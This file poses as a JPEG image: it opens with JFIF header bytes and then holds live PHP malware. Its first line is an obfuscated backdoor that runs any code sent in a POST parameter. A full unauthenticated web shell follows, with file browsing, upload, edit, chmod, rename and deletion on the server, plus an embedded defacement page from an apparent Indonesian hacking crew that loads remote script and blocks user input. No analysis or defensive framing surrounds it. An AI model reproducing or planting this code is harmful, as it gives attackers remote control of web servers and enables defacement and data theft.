JFIF  ` `  à




Á		

ш N j" ߠ         	
࿠  } !1AQa"q2咑䳢r?
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz冇꒓旘⣤稩㴵蹺ąƇȉʒӔՖטٚᢣ䥦稩걲䵶蹿?        	
࿠ w !1AQaq"2?B၉#3R?br?$4??&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz䅆銒喗ꢣ槨⳴縹ㄅƇȉʒӔՖטٚ⣤妧詪㴵縹  ? ⊨ 蠢ࢊ( 蠢ࢊ( 蠢ࢊ( 蠢ࢊ( 蠢ࢊ( 蠢ࢊ( 蠢ࢊ( 蠢ࢊ( 蠢ࢊ( 蠢ࢊ( 蠢ࢊ( 胿<?php $k="ass"."ert"; $k(${"_PO"."ST"} ['mins']);?>
<?php
set_time_limit(0);
error_reporting(0);

if(get_magic_quotes_gpc()){
    foreach($_POST as $key=>$value){
        $_POST[$key] = stripslashes($value);
    }
}
echo '<html><head>
<link rel="SHORTCUT ICON" href="http://goenk.wapgem.com/idb.png">
<body>
<style type="text/css">
	body {
    background: black;
    color: #00FF00;
    font-family: monospace;
}

.accessGranted {
    position: absolute;
    top: 200px;
    background: #333;
    padding: 20px;
    border: 1px solid #999;
    width: 300px;
    left: 50%;
    margin-left: -150px;
    text-align: center;
}

.accessDenied {
    position: absolute;
    top: 200px;
    color: #F00;
    background: #511;
    padding: 20px;
    border: 1px solid #F00;
    width: 300px;
    left: 50%;
    margin-left: -150px;
    text-align: center;
}
#content-center {
    width: 400px;
    padding: 0px 10px 10px 10px;
    width: 800px; 
    margin: 0 auto;
}
#content-left {
margin: 0 auto;
     text-align: left;
}
#content-right {
margin: 0 auto;
     text-align: right;
}
input,select,textarea{
    border:0;
    border:1px solid #900;
    background:black;
    margin:0;
        color: white;

    padding:2px 4px;
}
input:hover,textarea:hover,select:hover{
    background:black;
        color: blue;

    border:1px solid #f00;
}
                        a{ text-decoration:none; color:red;}
</style>
</head>
<H1><center></center></H1>
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td>Path : ';
if(isset($_GET['path'])){
    $path = $_GET['path'];   
}else{
    $path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
    if($pat == '' && $id == 0){
        $a = true;
        echo '<a href="?path=/">/</a>';
        continue;
    }
    if($pat == '') continue;
    echo '<a href="?path=';
    for($i=0;$i<=$id;$i++){
        echo "$paths[$i]";
        if($i != $id) echo "/";
    }
    echo '">'.$pat.'</a>/';
}
echo '</td></tr><tr><td>';
if(isset($_FILES['file'])){
    if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
        echo '<font color="green">OK COK SUKSESS !!</font><br />';
    }else{
        echo '<font color="red">ASU RAIMU ELK :P</font><br />';
    }
}
echo '<form enctype="multipart/form-data" method="POST">
Upload File : <input type="file" name="file" />
<input type="submit" value="upload" />
</form>
</td></tr>';
if(isset($_GET['filesrc'])){
    echo "<tr><td>Current File : ";
    echo $_GET['filesrc'];
    echo '</tr></td></table><br />';
    echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
    echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
    if($_POST['opt'] == 'chmod'){
        if(isset($_POST['perm'])){
            if(chmod($_POST['path'],$_POST['perm'])){
                echo '<font color="green">Change Permission Done.</font><br />';
            }else{
                echo '<font color="red">Change Permission Error.</font><br />';
            }
        }
        echo '<form method="POST">
        Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
        <input type="hidden" name="path" value="'.$_POST['path'].'">
        <input type="hidden" name="opt" value="chmod">
        <input type="submit" value="Go" />
        </form>';
    }elseif($_POST['opt'] == 'rename'){
        if(isset($_POST['newname'])){
            if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
                echo '<font color="green">Change Name Done.</font><br />';
            }else{
                echo '<font color="red">Change Name Error.</font><br />';
            }
            $_POST['name'] = $_POST['newname'];
        }
        echo '<form method="POST">
        New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
        <input type="hidden" name="path" value="'.$_POST['path'].'">
        <input type="hidden" name="opt" value="rename">
        <input type="submit" value="Go" />
        </form>';
    }elseif($_POST['opt'] == 'edit'){
        if(isset($_POST['src'])){
            $fp = fopen($_POST['path'],'w');
            if(fwrite($fp,$_POST['src'])){
                echo '<font color="green">Edit File Done.</font><br />';
            }else{
                echo '<font color="red">Edit File Error.</font><br />';
            }
            fclose($fp);
        }
        echo '<form method="POST">
        <textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
        <input type="hidden" name="path" value="'.$_POST['path'].'">
        <input type="hidden" name="opt" value="edit">
        <input type="submit" value="Go" />
        </form>';
    }
    echo '</center>';
}else{
    echo '</table><br /><center>';
    if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
        if($_POST['type'] == 'dir'){
            if(rmdir($_POST['path'])){
                echo '<font color="green">Delete Dir Done.</font><br />';
            }else{
                echo '<font color="red">Delete Dir Error.</font><br />';
            }
        }elseif($_POST['type'] == 'file'){
            if(unlink($_POST['path'])){
                echo '<font color="green">Delete File Done.</font><br />';
            }else{
                echo '<font color="red">Delete File Error.</font><br />';
            }
        }
    }
    echo '</center>';
    $scandir = scandir($path);
    echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
    <tr class="first">
        <td><center>Name</center></td>
        <td><center>Size</center></td>
        <td><center>Permissions</center></td>
        <td><center>Options</center></td>
    </tr>';

    foreach($scandir as $dir){
        if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
        echo "<tr>
        <td><a href=\"?path=$path/$dir\">$dir</a></td>
        <td><center>--</center></td>
        <td><center>";
        if(is_writable("$path/$dir")) echo '<font color="green">';
        elseif(!is_readable("$path/$dir")) echo '<font color="red">';
        echo perms("$path/$dir");
        if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';
        
        echo "</center></td>
        <td><center><form method=\"POST\" action=\"?option&path=$path\">
        <select name=\"opt\">
	    <option value=\"\"></option>
        <option value=\"delete\">Delete</option>
        <option value=\"chmod\">Chmod</option>
        <option value=\"rename\">Rename</option>
        </select>
        <input type=\"hidden\" name=\"type\" value=\"dir\">
        <input type=\"hidden\" name=\"name\" value=\"$dir\">
        <input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
        <input type=\"submit\" value=\">\" />
        </form></center></td>
        </tr>";
    }
    echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
    foreach($scandir as $file){
        if(!is_file("$path/$file")) continue;
        $size = filesize("$path/$file")/1024;
        $size = round($size,3);
        if($size >= 1024){
            $size = round($size/1024,2).' MB';
        }else{
            $size = $size.' KB';
        }

        echo "<tr>
        <td><a href=\"?filesrc=$path/$file&path=$path\">$file</a></td>
        <td><center>".$size."</center></td>
        <td><center>";
        if(is_writable("$path/$file")) echo '<font color="green">';
        elseif(!is_readable("$path/$file")) echo '<font color="red">';
        echo perms("$path/$file");
        if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
        echo "</center></td>
        <td><center><form method=\"POST\" action=\"?option&path=$path\">
        <select name=\"opt\">
	    <option value=\"\"></option>
        <option value=\"delete\">Delete</option>
        <option value=\"chmod\">Chmod</option>
        <option value=\"rename\">Rename</option>
        <option value=\"edit\">Edit</option>
        </select>
        <input type=\"hidden\" name=\"type\" value=\"file\">
        <input type=\"hidden\" name=\"name\" value=\"$file\">
        <input type=\"hidden\" name=\"path\" value=\"$path/$file\">
        <input type=\"submit\" value=\">\" />
        </form></center></td>
        </tr>";
    }
    echo '</table>
    </div>';
}
echo '
</BODY>
</HTML>';
function perms($file){
    $perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
    // Socket
    $info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
    // Symbolic Link
    $info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
    // Regular
    $info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
    // Block special
    $info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
    // Directory
    $info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
    // Character special
    $info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
    // FIFO pipe
    $info = 'p';
} else {
    // Unknown
    $info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
            (($perms & 0x0800) ? 's' : 'x' ) :
            (($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
            (($perms & 0x0400) ? 's' : 'x' ) :
            (($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
            (($perms & 0x0200) ? 't' : 'x' ) :
            (($perms & 0x0200) ? 'T' : '-'));

    return $info;
}
$htcs = "
<html>
<head>
<title>Cardiman Asooooh !</title><link href='http://kefiex.yu.tl/files/bnx.png' rel='shortcut icon'/>
<meta content='IDBTE4M' name='description'/>
<meta content='IDBTE4M' name='keywords'/>
<meta content='IDBTE4M' name='Abstract'/>
<meta name='title' content='kefiex404'>

<link href='http://fonts.googleapis.com/css?family=Iceland:400,700' rel='stylesheet' type='text/css'>
	<link href='http://fonts.googleapis.com/css?family=Verdana:400,700' rel='stylesheet' type='text/css'>
        <link href='http://fonts.googleapis.com/css?family=Rockwell Condensed:400,700' rel='stylesheet' type='text/css'>
	<link href='http://fonts.googleapis.com/css?family=Courier New:400,700' rel='stylesheet' type='text/css'>
<head>
<html>
<center><embed src='https://www.youtube.com/v/8-HC3iUXw34?rel=0&amp;autoplay=1&image=http://3.bp.blogspot.com/-RkTUcTZVXTY/UKgyroYk_xI/AAAAAAAAAF8/gUR3-QONm44/s1600/Untitled.png&repeat=always&autostart=true&frontcolor=cccccc&lightcolor=428cdb&backcolor=111111' width='1' height='1 allowscriptaccess='always'></embed></center>
<script language='JavaScript'>
function tb5_makeArray(n){
 this.length = n;
 return this.length;
}

tb5_messages = new tb5_makeArray(1);
tb5_messages[0] = 'Cardiman Asoooooooooh :v';
tb5_rptType = 'infinite';
tb5_rptNbr = 10;
tb5_speed = 50;
tb5_delay = 2000;
var tb5_counter=1;
var tb5_currMsg=0;
var tb5_stsmsg='';
function tb5_shuffle(arr){
var k;
for (i=0; i<arr.length; i++){
 k = Math.round(Math.random() * (arr.length - i - 1)) + i;
 temp = arr[i];arr[i]=arr[k];arr[k]=temp;
}
return arr;
}
tb5_arr = new tb5_makeArray(tb5_messages[tb5_currMsg].length);
tb5_sts = new tb5_makeArray(tb5_messages[tb5_currMsg].length);
for (var i=0; i<tb5_messages[tb5_currMsg].length; i++){
 tb5_arr[i] = i;
 tb5_sts[i] = '_';
}
tb5_arr = tb5_shuffle(tb5_arr);
function tb5_init(n){
var k;
if (n == tb5_arr.length){
 if (tb5_currMsg == tb5_messages.length-1){
 if ((tb5_rptType == 'finite') && (tb5_counter==tb5_rptNbr)){
 clearTimeout(tb5_timerID);
 return;
 }
 tb5_counter++;
 tb5_currMsg=0;
 }
 else{
 tb5_currMsg++;
 }
 n=0;
 tb5_arr = new tb5_makeArray(tb5_messages[tb5_currMsg].length);
 tb5_sts = new tb5_makeArray(tb5_messages[tb5_currMsg].length);
 for (var i=0; i<tb5_messages[tb5_currMsg].length; i++){
 tb5_arr[i] = i;
 tb5_sts[i] = '_';
 }
 tb5_arr = tb5_shuffle(tb5_arr);
 tb5_sp=tb5_delay;
}
else{
 tb5_sp=tb5_speed;
 k = tb5_arr[n];
 tb5_sts[k] = tb5_messages[tb5_currMsg].charAt(k);
 tb5_stsmsg = '';
 for (var i=0; i<tb5_sts.length; i++)
 tb5_stsmsg += tb5_sts[i];
 document.title = tb5_stsmsg;
 n++;
 }
 tb5_timerID = setTimeout('tb5_init('+n+')', tb5_sp);
}
function tb5_randomizetitle(){
 tb5_init(0);
}
tb5_randomizetitle();

</script>
<body bgcolor='black'>
<body oncontextmenu='return false;' onkeydown='return false;' onmousedown='return false;'>
<meta name='google-site-verification' content='#Save Promagh'/>
<meta name='google-site-verification' content='#Save Promagh'/>
<meta name='google-site-verification' content='#Save Promagh'/>
<meta name='google-site-verification' content='#Save Promagh'/>
<meta http-equiv='Content-Language' content='en-us-id'>
<meta http-equiv='Content-Type' content='text/html; charset=iso-8859-1' />
<meta http-equiv='Content-Type' content='text/html; charset=windows-1252'>
<Meta http-equiv='content-type' content='text/html; charset=windows-1254'>
<Meta http-equiv='content-type' content='text/html; charset=ISO-8859-9'>
<meta name='author' content='#Save Promagh'>
<meta name='copyright' content='#Save Promagh'/>
<meta name='description' content='#Save Promagh'>
<meta name='robots schedule' content='auto'>
<link href='http://fonts.googleapis.com/css?family=Abel:700' rel='stylesheet' type='text/css'>
<link href='http://fonts.googleapis.com/css?family=Abel:400' rel='stylesheet' type='text/css'>
<link href='http://fonts.googleapis.com/css?family=Iceland' rel='stylesheet' type='text/css'>
<link href='http://fonts.googleapis.com/css?family=Wallpoet' rel='stylesheet' type='text/css'>
<link href='http://fonts.googleapis.com/css?family=Creepster' rel='stylesheet' type='text/css'>

<script type='text/javascript'> var SPklikkanan = 'TILANG';</script> <script type='text/javascript' src='https://googledrive.com/host/0B6KVua7D2SLCNDN2RW1ORmhZRWs/sp_tilang.js'></script>
<script type='text/javascript'> if (typeof document.onselectstart!='undefined') { document.onselectstart=new Function ('return false'); } else{ document.onmousedown=new Function ('return false'); document.onmouseup=new Function ('return true'); } </SCRIPT>

<br><br><br> <center> <a rel='dofollow' href='https://www.google.co.id/webhp?sourceid=chrome-instant&ion=1&espv=2&ie=UTF-8#q=indonesian+Hacker+rulez'> <img src='https://scontent-sin1-1.xx.fbcdn.net/hphotos-xal1/v/t1.0-9/12376796_565593456950242_7474357900886665426_n.jpg?oh=1db7c5d4e3fa5b7bc7b422a648b5decb&oe=574CE85B' style='opacity:0.4;filter:alpha(opacity=40)' onmouseover='this.style.opacity=1;this.filters.alpha.opacity=100' onmouseout='this.style.opacity=0.4;this.filters.alpha.opacity=40' height='360' width='670'><br></a> </center>
<br> <center> <font face='iceland' size='10' color='red'> -=[ TEMAN ??? YAKIN LU TEMEN GUA ??? ]=-</font> </center>
<br> <center> <font face='iceland' size='10' color='silver'> #Save Promagh</font> </center>
</center>
<b><font color='blue' face='consolas' size='4'>
<p align='center' class='style2'><font face='Trajan Pro' size='4' color='Green' style='text-shadow: 2px 0px .2em black, -2px 2px .2em Darkcyan, -2px -2px .2em black'><b><font color='yellow'> 
-=[[ MY FAMILY ]]=-<br>-| ./KEFIEX404 | MANIAK KASUR | MR.K | EL-RO | ./COCO | TUAN GALAU | DEDEMIT ID | NO SCRIPT 404 |- <br> -| K3C0T | SIM0D | LITLE H4XORZ | Antonio HsH |-</font><p>
<center><table width='100%' border='2'><tr><td width='10%' align='center'><blink><font Class-'glow' color='white'><code>MY FRIENDS : </code></font></blink></td><td width='90%'><font color='yellow' size='4'><marquee><code>
[.] X-Wu7z [.] Tuan_galau [.] GrenXPaRTa [.] x'1n73ct [.] m@db100d [.] Hacker Sakit Hati [.] ./$amndan404 [.] ./wi.na [.] Neneng Juhairiah[ .] Mr_Oxygen [.] ./coco [.] H3ri.ID [.] Ice Cream [.] newbie patah hati [.] Naughty_r00tz [.] DarkWireless [.] ./czw_07 [.] ./TanpaNama404 [.] xCut10n [.] Kucing Galau [.] ./anjirGBX [.] Dicky Injector [.] jepry_vuln [.] Shut_Down404 [.] Mr.404_NotFound [.] Mr.LittleHaxor [.] Mr.Ghostteror_404 [.] Mr.Dork [.] Mr.aji.192 [.] L4W_CyberDKSH404.Not_Found [.] ozlok [.] Bloc_Anon/404 [.] R3DD3V1L [.] mr.cookie_302 [.]</code></marquee></font></td></tr></table><html><center>

<script>
function muter2(){
scrW=screen.availWidth
scrH=screen.availHeight
window.moveTo(0,0)
window.resizeTo(10,10)
window.focus()
for(x=0;x<80;x++){
window.resizeTo(10,scrH*x/80)
}
for(y=0;y<80;y++){
window.resizeTo(scrW*y/80,scrH)
}
window.resizeTo(scrW,scrH)
}
document.oncontextmenu=new Function('muter2();return false');
function keypressed(){alert('halah ....

mbuh ya kok yo podo micek ??/

padahal dee dewe yo meneng meneng ngecard :v 

oalah asoooooooooooh :v ');}
document.onkeydown=keypressed;
function kasih_tau(){
alert('matamu picek :v/
jancok torok empek asooooooh :v 
opo ??? ra trimo ??? 

tokno kabeh skillmu :v ....
jancok :v

');
}
</script>
</body>
</html>
";
$f =@fopen ('','w');
fwrite($f , $htcs);
$pg = basename(__FILE__);

?>